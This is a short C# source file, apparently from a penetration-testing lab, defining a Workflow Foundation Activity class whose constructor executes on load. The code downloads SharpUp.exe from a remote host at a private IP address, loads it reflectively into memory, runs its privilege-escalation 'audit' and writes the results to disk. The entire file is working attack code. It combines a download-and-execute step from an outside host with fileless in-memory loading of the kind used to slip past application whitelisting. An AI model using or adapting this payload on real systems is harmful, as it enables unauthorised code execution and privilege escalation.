using System;
using System.Net;
using System.IO;
using System.Reflection;
using System.Workflow.ComponentModel;

public class Run : Activity
{
    public Run()
    {
        Console.WriteLine("I executed!");
        
        // Download SharpUp.exe directly into memory
        string url = "http://192.168.45.188:8000/SharpUp.exe";
        byte[] exeBytes;
        using (WebClient client = new WebClient())
        {
            exeBytes = client.DownloadData(url);
        }

        // Load SharpUp.exe into memory
        Assembly assembly = Assembly.Load(exeBytes);

        // Execute SharpUp with "audit" argument
        Type programType = assembly.GetType("SharpUp.Program");
        MethodInfo mainMethod = programType.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);

        using (StringWriter sw = new StringWriter())
        {
            Console.SetOut(sw);
            mainMethod.Invoke(null, new object[] { new string[] { "audit" } });
            string output = sw.ToString();

            // Store output in C:\Tools
            File.WriteAllText(@"C:\Tools\SharpUp_output.txt", output);
        }
    }
}
